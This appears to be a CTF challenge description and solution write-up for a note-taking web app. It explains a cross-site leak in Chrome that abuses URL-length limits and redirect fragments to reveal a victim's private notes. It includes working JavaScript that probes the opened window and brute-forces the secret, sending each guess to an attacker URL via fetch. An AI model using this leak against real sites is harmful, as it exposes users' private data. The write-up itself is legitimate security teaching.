## Description

We have credible intelligence that Sussy McSus, CEO of EvilCorp, a shady MultiNational Corporation, is using this note-taking app to store sensitive information. He is known to be in cahoots with the SEE-IA. Can you find out what he is up to?

Note: the target page is `http://mnc.web.seetf.sg:1337/`.

## Difficulty

Hard

## Deployment

`docker-compose up -d`

## Solution

**Tested on Chrome Version 110.0.5481.77 (Official Build) (x86_64)**

Abusing Chrome's behavior when dealing with long URLs combined with URI fragments persisting across server redirects. I found this technique as an [unintended solution to `secrets` from HackTM CTF 2023](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets).

This issue is currently [pending a fix](https://bugs.chromium.org/p/chromium/issues/detail?id=1417488) by Chromium so we may have to intentionally downgrade the Chrome version if it gets fixed before the CTF.

If the note is found, the user is redirected to `?found=1#<base64 encoded JSON array of note IDs>`, otherwise they are redirected to `?found=0`.

```javascript
const found = req.session.notes.filter(note => note.text.includes(query));

if (!found.length) {
    return res.redirect('/?found=0');
}
return res.redirect(`/?found=1#${btoa(JSON.stringify(found.map(note => note.id)))}`);
```

Because URI fragments persist across server-side redirects, we can artificially inflate the URL length by adding a long fragment so that it is exactly 1 byte less than [Chrome's 2MB limit](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#url-length).

When a redirect causes the URL to increase in length, the 2MB limit is hit and the navigation is aborted. The page would become `about:blank#blocked`. Interestingly, this means that the window reference is treated as same-origin and the opener is able to read `window.origin` and other sensitive properties that are normally inaccessible from a cross-origin page.

This gives us two cases:

1. `?q=<guess>#AAA...AAA` finds a note. The user is redirected to `/?found=1#<base64 encoded JSON array of note IDs>`. Because the redirect includes a fragment, the long `#AAA...AAA` fragment is replaced with the new, much shorter fragment. The navigation proceeds as normal and the window is treated as cross-origin.
2. `?q=<guess>#AAA...AAA` does not find a note. The user is redirected to `/?found=0`. Because the redirect does not include a fragment, the long `#AAA...AAA` fragment is preserved. The navigation is aborted and the window is treated as same-origin.

Our goal is to distinguish between these two cases.

We can do this by catching the error thrown when attempting to access `window.origin` of a cross-origin window. If the error is thrown, we know that the URL length limit not exceeded and the note was found.

```javascript
const leak = async (url) => {
    let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length - 1));
    await sleep(800);
    try {
        // Page is still same-origin, so about:blank page loaded
        // The URL length limit was exceeded
        w.origin;
        await w.close();
        return 0;
    } catch {
        // The URL length limit was not exceeded, so note was found
        await w.close();
        return 1;
    }
}
```

In order to detect the redirects, we must keep our query sufficiently short so that the original URL is at least 1 byte less than the final redirected URL. This means that we can only check 4 characters at a time (`?q=AAAA` is exactly 1 byte less than `?found=0`). We can use this to brute-force the flag character by character.

```javascript
const solve = async (char) => {
    // ?q=AAAA   redirects to
    // ?found=0  if note not found (so the URL is one character too long)
    // We can only check 4 characters at a time
    if (await leak(`http://chall?q=${flag.slice(-3) + char}`)) {
        await fetch(`${OUR_URL}?flag=${flag + char}`);
        return true;
    }
}
```
